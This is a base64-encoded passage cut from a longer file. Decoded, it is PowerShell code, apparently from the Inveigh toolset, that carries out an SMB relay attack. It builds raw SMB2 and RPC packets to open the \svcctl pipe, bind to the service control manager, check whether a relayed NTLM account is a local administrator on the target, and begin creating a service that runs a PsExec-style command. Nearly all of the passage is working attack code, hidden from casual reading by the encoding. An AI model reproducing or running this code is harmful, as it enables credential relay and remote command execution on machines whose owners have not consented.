cmdldCIpCiAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0YWdlID0gJ0V4aXQnCgogICAgICAgICAgICAgICAgICAgICAgICBpZigkaW52ZWlnaC5maWxlX291dHB1dCkKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2gubG9nX2ZpbGVfcXVldWUuQWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtIFNNQiByZWxheSBmYWlsZWQgb24gJFRhcmdldCIpCiAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRpbnZlaWdoLmxvZ19vdXRwdXQpCiAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmxvZy5BZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gU01CIHJlbGF5IGZhaWxlZCBvbiAkVGFyZ2V0IikKICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgfSAgCiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgewogICAgICAgICAgICAKICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0YWdlID0gJ1RyZWVDb25uZWN0JwoKICAgICAgICAgICAgICAgIDpTTUJfZXhlY3V0ZV9sb29wIHdoaWxlICgkU01CX2NsaWVudF9zdGFnZSAtbmUgJ2V4aXQnKQogICAgICAgICAgICAgICAgewoKICAgICAgICAgICAgICAgICAgICBzd2l0Y2ggKCRTTUJfY2xpZW50X3N0YWdlKQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICdUcmVlQ29ubmVjdCcKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQjJfbWVzc2FnZV9JRCA9IDQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfU01CMl9oZWFkZXIgPSBHZXQtUGFja2V0U01CMkhlYWRlciAweDAzLDB4MDAgJFNNQjJfbWVzc2FnZV9JRCAkU01CMl90cmVlX0lEICRTTUJfc2Vzc2lvbl9JRAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9TTUIyX2hlYWRlclsiU01CMkhlYWRlcl9DcmVkaXRSZXF1ZXN0Il0gPSAweDdmLDB4MDAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfU01CMl9kYXRhID0gR2V0LVBhY2tldFNNQjJUcmVlQ29ubmVjdFJlcXVlc3QgJFNNQl9wYXRoX2J5dGVzCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CMl9oZWFkZXIgPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X1NNQjJfaGVhZGVyCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CMl9kYXRhID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9TTUIyX2RhdGEgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X05ldEJJT1Nfc2Vzc2lvbl9zZXJ2aWNlID0gR2V0LVBhY2tldE5ldEJJT1NTZXNzaW9uU2VydmljZSAkU01CMl9oZWFkZXIuTGVuZ3RoICRTTUIyX2RhdGEuTGVuZ3RoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTmV0QklPU19zZXNzaW9uX3NlcnZpY2UgPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X05ldEJJT1Nfc2Vzc2lvbl9zZXJ2aWNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zZW5kID0gJE5ldEJJT1Nfc2Vzc2lvbl9zZXJ2aWNlICsgJFNNQjJfaGVhZGVyICsgJFNNQjJfZGF0YQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc3RyZWFtLldyaXRlKCRTTUJfY2xpZW50X3NlbmQsMCwkU01CX2NsaWVudF9zZW5kLkxlbmd0aCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0cmVhbS5GbHVzaCgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zdHJlYW0uUmVhZCgkU01CX2NsaWVudF9yZWNlaXZlLDAsJFNNQl9jbGllbnRfcmVjZWl2ZS5MZW5ndGgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zdGFnZSA9ICdDcmVhdGVSZXF1ZXN0JwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAnQ3JlYXRlUmVxdWVzdCcKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQjJfdHJlZV9JRCA9IDB4MDEsMHgwMCwweDAwLDB4MDAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfbmFtZWRfcGlwZV9ieXRlcyA9IDB4NzMsMHgwMCwweDc2LDB4MDAsMHg2MywweDAwLDB4NjMsMHgwMCwweDc0LDB4MDAsMHg2YywweDAwICMgXHN2Y2N0bAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQjJfbWVzc2FnZV9JRCArPSAxCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X1NNQjJfaGVhZGVyID0gR2V0LVBhY2tldFNNQjJIZWFkZXIgMHgwNSwweDAwICRTTUIyX21lc3NhZ2VfSUQgJFNNQjJfdHJlZV9JRCAkU01CX3Nlc3Npb25fSUQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfU01CMl9oZWFkZXJbIlNNQjJIZWFkZXJfQ3JlZGl0UmVxdWVzdCJdID0gMHg3ZiwweDAwCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X1NNQjJfZGF0YSA9IEdldC1QYWNrZXRTTUIyQ3JlYXRlUmVxdWVzdEZpbGUgJFNNQl9uYW1lZF9waXBlX2J5dGVzCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X1NNQjJfZGF0YVsiU01CMkNyZWF0ZVJlcXVlc3RGaWxlX1NoYXJlX0FjY2VzcyJdID0gMHgwNywweDAwLDB4MDAsMHgwMCAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CMl9oZWFkZXIgPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X1NNQjJfaGVhZGVyCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CMl9kYXRhID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9TTUIyX2RhdGEgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9OZXRCSU9TX3Nlc3Npb25fc2VydmljZSA9IEdldC1QYWNrZXROZXRCSU9TU2Vzc2lvblNlcnZpY2UgJFNNQjJfaGVhZGVyLkxlbmd0aCAkU01CMl9kYXRhLkxlbmd0aAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJE5ldEJJT1Nfc2Vzc2lvbl9zZXJ2aWNlID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9OZXRCSU9TX3Nlc3Npb25fc2VydmljZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc2VuZCA9ICROZXRCSU9TX3Nlc3Npb25fc2VydmljZSArICRTTUIyX2hlYWRlciArICRTTUIyX2RhdGEKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0cmVhbS5Xcml0ZSgkU01CX2NsaWVudF9zZW5kLDAsJFNNQl9jbGllbnRfc2VuZC5MZW5ndGgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zdHJlYW0uRmx1c2goKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc3RyZWFtLlJlYWQoJFNNQl9jbGllbnRfcmVjZWl2ZSwwLCRTTUJfY2xpZW50X3JlY2VpdmUuTGVuZ3RoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc3RhZ2UgPSAnUlBDQmluZCcKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICdSUENCaW5kJwogICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX25hbWVkX3BpcGVfYnl0ZXMgPSAweDczLDB4MDAsMHg3NiwweDAwLDB4NjMsMHgwMCwweDYzLDB4MDAsMHg3NCwweDAwLDB4NmMsMHgwMCAjIFxzdmNjdGwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfZmlsZV9JRCA9ICRTTUJfY2xpZW50X3JlY2VpdmVbMTMyLi4xNDddCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CMl9tZXNzYWdlX0lEICs9IDEKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfU01CMl9oZWFkZXIgPSBHZXQtUGFja2V0U01CMkhlYWRlciAweDA5LDB4MDAgJFNNQjJfbWVzc2FnZV9JRCAkU01CMl90cmVlX0lEICRTTUJfc2Vzc2lvbl9JRAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9TTUIyX2hlYWRlclsiU01CMkhlYWRlcl9DcmVkaXRSZXF1ZXN0Il0gPSAweDdmLDB4MDAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfUlBDX2RhdGEgPSBHZXQtUGFja2V0UlBDQmluZCAxIDB4YjgsMHgxMCAweDAxIDB4MDAsMHgwMCAkU01CX25hbWVkX3BpcGVfVVVJRCAweDAyLDB4MDAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRSUENfZGF0YSA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfUlBDX2RhdGEgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X1NNQjJfZGF0YSA9IEdldC1QYWNrZXRTTUIyV3JpdGVSZXF1ZXN0ICRTTUJfZmlsZV9JRCAkUlBDX2RhdGEuTGVuZ3RoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CMl9oZWFkZXIgPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X1NNQjJfaGVhZGVyCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CMl9kYXRhID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9TTUIyX2RhdGEgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkUlBDX2RhdGFfbGVuZ3RoID0gJFNNQjJfZGF0YS5MZW5ndGggKyAkUlBDX2RhdGEuTGVuZ3RoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X05ldEJJT1Nfc2Vzc2lvbl9zZXJ2aWNlID0gR2V0LVBhY2tldE5ldEJJT1NTZXNzaW9uU2VydmljZSAkU01CMl9oZWFkZXIuTGVuZ3RoICRSUENfZGF0YV9sZW5ndGgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICROZXRCSU9TX3Nlc3Npb25fc2VydmljZSA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfTmV0QklPU19zZXNzaW9uX3NlcnZpY2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3NlbmQgPSAkTmV0QklPU19zZXNzaW9uX3NlcnZpY2UgKyAkU01CMl9oZWFkZXIgKyAkU01CMl9kYXRhICsgJFJQQ19kYXRhCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zdHJlYW0uV3JpdGUoJFNNQl9jbGllbnRfc2VuZCwwLCRTTUJfY2xpZW50X3NlbmQuTGVuZ3RoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc3RyZWFtLkZsdXNoKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0cmVhbS5SZWFkKCRTTUJfY2xpZW50X3JlY2VpdmUsMCwkU01CX2NsaWVudF9yZWNlaXZlLkxlbmd0aCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0YWdlID0gJ1JlYWRSZXF1ZXN0JwogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc3RhZ2VfbmV4dCA9ICdPcGVuU0NNYW5hZ2VyVycKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgJ1JlYWRSZXF1ZXN0JwogICAgICAgICAgICAgICAgICAgICAgICB7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgU3RhcnQtU2xlZXAgLW0gMTUwCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CMl9tZXNzYWdlX0lEICs9IDEKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfU01CMl9oZWFkZXIgPSBHZXQtUGFja2V0U01CMkhlYWRlciAweDA4LDB4MDAgJFNNQjJfbWVzc2FnZV9JRCAkU01CMl90cmVlX0lEICRTTUJfc2Vzc2lvbl9JRAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9TTUIyX2hlYWRlclsiU01CMkhlYWRlcl9DcmVkaXRSZXF1ZXN0Il0gPSAweDdmLDB4MDAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfU01CMl9oZWFkZXJbIlNNQjJIZWFkZXJfQ3JlZGl0Q2hhcmdlIl0gPSAweDEwLDB4MDAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfU01CMl9kYXRhID0gR2V0LVBhY2tldFNNQjJSZWFkUmVxdWVzdCAkU01CX2ZpbGVfSUQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUIyX2hlYWRlciA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfU01CMl9oZWFkZXIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUIyX2RhdGEgPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X1NNQjJfZGF0YSAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfTmV0QklPU19zZXNzaW9uX3NlcnZpY2UgPSBHZXQtUGFja2V0TmV0QklPU1Nlc3Npb25TZXJ2aWNlICRTTUIyX2hlYWRlci5MZW5ndGggJFNNQjJfZGF0YS5MZW5ndGgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICROZXRCSU9TX3Nlc3Npb25fc2VydmljZSA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfTmV0QklPU19zZXNzaW9uX3NlcnZpY2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3NlbmQgPSAkTmV0QklPU19zZXNzaW9uX3NlcnZpY2UgKyAkU01CMl9oZWFkZXIgKyAkU01CMl9kYXRhIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc3RyZWFtLldyaXRlKCRTTUJfY2xpZW50X3NlbmQsMCwkU01CX2NsaWVudF9zZW5kLkxlbmd0aCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0cmVhbS5GbHVzaCgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zdHJlYW0uUmVhZCgkU01CX2NsaWVudF9yZWNlaXZlLDAsJFNNQl9jbGllbnRfcmVjZWl2ZS5MZW5ndGgpCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYoW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpUb1N0cmluZygkU01CX2NsaWVudF9yZWNlaXZlWzEyLi4xNV0pIC1uZSAnMDMtMDEtMDAtMDAnKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0YWdlID0gJFNNQl9jbGllbnRfc3RhZ2VfbmV4dAogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0YWdlID0gJ1N0YXR1c1BlbmRpbmcnCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICAnU3RhdHVzUGVuZGluZycKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc3RyZWFtLlJlYWQoJFNNQl9jbGllbnRfcmVjZWl2ZSwwLCRTTUJfY2xpZW50X3JlY2VpdmUuTGVuZ3RoKQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKFtTeXN0ZW0uQml0Q29udmVydGVyXTo6VG9TdHJpbmcoJFNNQl9jbGllbnRfcmVjZWl2ZVsxMi4uMTVdKSAtbmUgJzAzLTAxLTAwLTAwJykKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zdGFnZSA9ICRTTUJfY2xpZW50X3N0YWdlX25leHQKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAnT3BlblNDTWFuYWdlclcnCiAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUIyX21lc3NhZ2VfSUQgPSAzMAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9TTUIyX2hlYWRlciA9IEdldC1QYWNrZXRTTUIySGVhZGVyIDB4MDksMHgwMCAkU01CMl9tZXNzYWdlX0lEICRTTUIyX3RyZWVfSUQgJFNNQl9zZXNzaW9uX0lECiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X1NNQjJfaGVhZGVyWyJTTUIySGVhZGVyX0NyZWRpdFJlcXVlc3QiXSA9IDB4N2YsMHgwMAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9TQ01fZGF0YSA9IEdldC1QYWNrZXRTQ01PcGVuU0NNYW5hZ2VyVyAkU01CX3NlcnZpY2VfYnl0ZXMgJFNNQl9zZXJ2aWNlX2xlbmd0aAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNDTV9kYXRhID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9TQ01fZGF0YQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9SUENfZGF0YSA9IEdldC1QYWNrZXRSUENSZXF1ZXN0IDB4MDMgJFNDTV9kYXRhLkxlbmd0aCAwIDAgMHgwMSwweDAwLDB4MDAsMHgwMCAweDAwLDB4MDAgMHgwZiwweDAwCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkUlBDX2RhdGEgPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X1JQQ19kYXRhIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9TTUIyX2RhdGEgPSBHZXQtUGFja2V0U01CMldyaXRlUmVxdWVzdCAkU01CX2ZpbGVfSUQgKCRSUENfZGF0YS5MZW5ndGggKyAkU0NNX2RhdGEuTGVuZ3RoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQjJfaGVhZGVyID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9TTUIyX2hlYWRlcgogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQjJfZGF0YSA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfU01CMl9kYXRhIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFJQQ19kYXRhX2xlbmd0aCA9ICRTTUIyX2RhdGEuTGVuZ3RoICsgJFNDTV9kYXRhLkxlbmd0aCArICRSUENfZGF0YS5MZW5ndGgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfTmV0QklPU19zZXNzaW9uX3NlcnZpY2UgPSBHZXQtUGFja2V0TmV0QklPU1Nlc3Npb25TZXJ2aWNlICRTTUIyX2hlYWRlci5MZW5ndGggJFJQQ19kYXRhX2xlbmd0aAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJE5ldEJJT1Nfc2Vzc2lvbl9zZXJ2aWNlID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9OZXRCSU9TX3Nlc3Npb25fc2VydmljZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc2VuZCA9ICROZXRCSU9TX3Nlc3Npb25fc2VydmljZSArICRTTUIyX2hlYWRlciArICRTTUIyX2RhdGEgKyAkUlBDX2RhdGEgKyAkU0NNX2RhdGEKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0cmVhbS5Xcml0ZSgkU01CX2NsaWVudF9zZW5kLDAsJFNNQl9jbGllbnRfc2VuZC5MZW5ndGgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zdHJlYW0uRmx1c2goKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc3RyZWFtLlJlYWQoJFNNQl9jbGllbnRfcmVjZWl2ZSwwLCRTTUJfY2xpZW50X3JlY2VpdmUuTGVuZ3RoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc3RhZ2UgPSAnUmVhZFJlcXVlc3QnCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zdGFnZV9uZXh0ID0gJ0NoZWNrQWNjZXNzJyAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgICdDaGVja0FjY2VzcycKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZihbU3lzdGVtLkJpdENvbnZlcnRlcl06OlRvU3RyaW5nKCRTTUJfY2xpZW50X3JlY2VpdmVbMTI4Li4xMzFdKSAtZXEgJzAwLTAwLTAwLTAwJyAtYW5kIFtTeXN0ZW0uQml0Q29udmVydGVyXTo6VG9TdHJpbmcoJFNNQl9jbGllbnRfcmVjZWl2ZVsxMDguLjEyN10pIC1uZSAnMDAtMDAtMDAtMDAtMDAtMDAtMDAtMDAtMDAtMDAtMDAtMDAtMDAtMDAtMDAtMDAtMDAtMDAtMDAtMDAnKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUuQWRkKCIkSFRUUF9OVExNX2RvbWFpbl9zdHJpbmdcJEhUVFBfTlRMTV91c2VyX3N0cmluZyBpcyBhIGxvY2FsIGFkbWluaXN0cmF0b3Igb24gJFRhcmdldCIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9zZXJ2aWNlX21hbmFnZXJfY29udGV4dF9oYW5kbGUgPSAkU01CX2NsaWVudF9yZWNlaXZlWzEwOC4uMTI3XQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfU0NNX2RhdGEgPSBHZXQtUGFja2V0U0NNQ3JlYXRlU2VydmljZVcgJFNNQl9zZXJ2aWNlX21hbmFnZXJfY29udGV4dF9oYW5kbGUgJFNNQl9zZXJ2aWNlX2J5dGVzICRTTUJfc2VydmljZV9sZW5ndGggJFBzRXhlY19jb21tYW5kX2J5dGVzICRQc0V4ZWNfY29tbWFuZF9sZW5ndGhfYnl0ZXMKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU0NNX2RhdGEgPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X1NDTV9kYXRhCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRpbnZlaWdoLmZpbGVfb3V0cHV0KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2gubG9nX2ZpbGVfcXVldWUuQWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtICRIVFRQX05UTE1fZG9tYWluX3N0cmluZ1wkSFRUUF9OVExNX3VzZXJfc3RyaW5nIGlzIGEgbG9jYWwgYWRtaW5pc3RyYXRvciBvbiAkVGFyZ2V0IikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRpbnZlaWdoLmxvZ19vdXRwdXQpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5sb2cuQWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtICRIVFRQX05UTE1fZG9tYWluX3N0cmluZ1wkSFRUUF9OVExNX3VzZXJfc3RyaW5nIGlzIGEgbG9jYWwgYWRtaW5pc3RyYXRvciBvbiAkVGFyZ2V0IikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRTQ01fZGF0YS5MZW5ndGggLWx0ICRTTUJfc3BsaXRfaW5kZXgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zdGFnZSA9ICdDcmVhdGVTZXJ2aWNlVycKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc3RhZ2UgPSAnQ3JlYXRlU2VydmljZVdfRmlyc3QnCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2VpZihbU3lzdGVtLkJpdENvbnZlcnRlcl06OlRvU3RyaW5nKCRTTUJfY2xpZW50X3JlY2VpdmVbMTI4Li4xMzFdKSAtZXEgJzA1LTAwLTAwLTAwJykKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlLkFkZCgiJEhUVFBfTlRMTV9kb21haW5fc3RyaW5nXCRIVFRQX05UTE1fdXNlcl9zdHJpbmcgaXMgbm90IGEgbG9jYWwgYWRtaW5pc3RyYXRvciBvciBkb2VzIG5vdCBoYXZlIHJlcXVpcmVkIHByaXZpbGVnZSBvbiAkVGFyZ2V0IikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX3JlbGF5X2ZhaWxlZCA9ICR0cnVlCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRpbnZlaWdoLmZpbGVfb3V0cHV0KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2gubG9nX2ZpbGVfcXVldWUuQWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtICRIVFRQX05UTE1fZG9tYWluX3N0cmluZ1wkSFRUUF9OVExNX3VzZXJfc3RyaW5nIGlzIG5vdCBhIGxvY2FsIGFkbWluaXN0cmF0b3Igb3IgZG9lcyBub3QgaGF2ZSByZXF1aXJlZCBwcml2aWxlZ2Ugb24gJFRhcmdldCIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZigkaW52ZWlnaC5sb2dfb3V0cHV0KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2gubG9nLkFkZCgiJChHZXQt